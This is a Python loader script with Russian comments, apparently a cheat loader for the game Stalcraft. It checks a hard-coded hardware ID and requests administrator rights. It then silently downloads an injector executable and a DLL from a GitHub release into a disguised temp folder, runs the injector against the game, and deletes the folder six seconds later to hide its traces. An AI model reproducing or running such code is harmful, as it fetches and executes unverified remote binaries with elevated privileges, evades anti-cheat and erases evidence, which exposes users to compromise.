import os
import sys
import urllib.request
import subprocess
import ctypes
import time
import shutil
import threading

# ========== HWID ПРОВЕРКА ==========
ALLOWED_HWID = "SN192308972930_73KRD8VES_AA04012700008571"

def get_disk_serials():
    serials = []
    try:
        result = subprocess.run(['wmic', 'diskdrive', 'get', 'serialnumber'], 
                                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if result.returncode == 0:
            lines = result.stdout.strip().split('\n')[1:]
            for line in lines:
                serial = line.strip()
                if serial and serial != '0' and len(serial) > 3:
                    serials.append(serial)
    except:
        pass
    return serials

def check_hwid():
    current_serials = get_disk_serials()
    if not current_serials:
        sys.exit(0)
    current_hwid = "_".join(current_serials)
    if current_hwid != ALLOWED_HWID:
        sys.exit(0)

check_hwid()

# Запрос прав админа
def request_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
    except:
        pass

request_admin()

# ========== ПРОВЕРКА ПРОЦЕССА STALCRAFT ==========
def check_stalcraft_process():
    print("[*] ПРОВЕРКА stalcraft.exe...")
    for attempt in range(30):  # ПРОВЕРЯЕМ 30 РАЗ (30 СЕКУНД)
        try:
            result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq stalcraft.exe'], 
                                    capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if "stalcraft.exe" in result.stdout:
                print("[+] stalcraft.exe ОБНАРУЖЕН, НАЧИНАЮ ОБХОД")
                return True
        except:
            pass
        time.sleep(1)
    print("[-] stalcraft.exe НЕ НАЙДЕН, ВЫХОД")
    sys.exit(0)

# ЗАПУСКАЕМ ПРОВЕРКУ
check_stalcraft_process()

temp_dir = r"C:\Users\Luser\AppData\Local\Temp\System_Data_2438171758912246327"
os.makedirs(temp_dir, exist_ok=True)

files = {
    "Extreme.Injector.v3.exe": "https://github.com/kirill011009/ORPWRW-/releases/download/3%D0%BA34%D0%BA3%D0%BA/Extreme.Injector.v3.exe",
    "settings.xml": "https://github.com/kirill011009/ORPWRW-/releases/download/3%D0%BA34%D0%BA3%D0%BA/settings.xml",
    "vibrix.dll": "https://github.com/kirill011009/ORPWRW-/releases/download/3%D0%BA34%D0%BA3%D0%BA/vibrix.dll"
}

# ОБХОД - ТИХАЯ ЗАГРУЗКА
for filename, url in files.items():
    filepath = os.path.join(temp_dir, filename)
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            with open(filepath, 'wb') as out_file:
                out_file.write(response.read())
    except:
        pass

print("[*] ОБХОД ЗАВЕРШЕН")
time.sleep(2)

exe_path = os.path.join(temp_dir, "Extreme.Injector.v3.exe")

# ФУНКЦИЯ ДЛЯ УДАЛЕНИЯ ЧЕРЕЗ 6 СЕКУНД
def delete_after_delay():
    time.sleep(6)
    try:
        shutil.rmtree(temp_dir, ignore_errors=True)
    except:
        pass

if os.path.exists(exe_path):
    subprocess.Popen([exe_path], cwd=temp_dir, shell=True)
    # ЗАПУСКАЕМ ТАЙМЕР НА УДАЛЕНИЕ
    delete_thread = threading.Thread(target=delete_after_delay)
    delete_thread.daemon = True
    delete_thread.start()
